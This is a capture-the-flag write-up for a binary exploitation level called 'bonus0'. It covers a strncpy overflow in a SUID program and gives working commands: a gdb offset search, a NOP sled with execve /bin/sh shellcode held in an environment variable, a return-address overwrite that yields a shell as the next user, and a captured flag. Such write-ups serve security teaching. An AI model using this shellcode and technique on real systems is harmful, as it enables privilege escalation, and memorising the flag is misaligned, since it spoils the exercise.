# Bonus 0

SUID **bonus1**. NX off (`GNU_STACK` is `RWE`), so injected shellcode runs. Bug: `strncpy(dest, buffer, 20)` with no terminator lets two 20-byte inputs run together and overflow `main`'s `buf`.

1. Find the offset (cyclic pattern as input 2, two separate writes since `p()` calls `read()` twice):
   ```
   (python -c 'print "0"*20'; sleep 0.3; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"'; sleep 0.3) | gdb -q -batch -ex run -ex 'p/x $eip' ./bonus0
   0x41336141 in ?? ()
   ```
   `"Aa3A"` → offset **9**.

2. Export a big NOP sled + shellcode as an environment variable (no size limit, unlike `p()`'s 4096-byte `buffer`, so we can afford tens of thousands of bytes of margin instead of ~100), and find its address. Measure this right before step 3, in the same terminal:
   ```
   export SHELLCODE=$(python -c 'print "\x90"*65536 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"')
   gdb -q -batch -ex "b *main" -ex run -ex 'p (char *)getenv("SHELLCODE")' ./bonus0
   $1 = 0xbffefe72 "\220\220\220..."
   ```
   Aim well inside the 64KB sled, not at its edge: `0xbffefe72 + 0x8000 = 0xbfff6e72` → `\x72\x6e\xff\xbf`.

3. Run it, in the same terminal, right after step 2 (`SHELLCODE` must still be exported):
   ```
   (python -c 'print "A"*20'; sleep 0.3; python -c 'print "A"*9 + "\x72\x6e\xff\xbf" + "B"*7'; sleep 0.3; cat) | ./bonus0
   id
   uid=2010(bonus0) [...] euid=2011(bonus1) [...]
   cat /home/user/bonus1/.pass
   ```
   Segfault instead? Redo step 2 immediately before step 3 (don't reuse an address from an earlier session or a different terminal), the sled is big but not infinite.

`Ressources/exploit.py` builds this with `struct.pack` (edit the address constant after running gdb, then `export SHELLCODE=...` and `(python exploit.py; cat) | ./bonus0`).

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
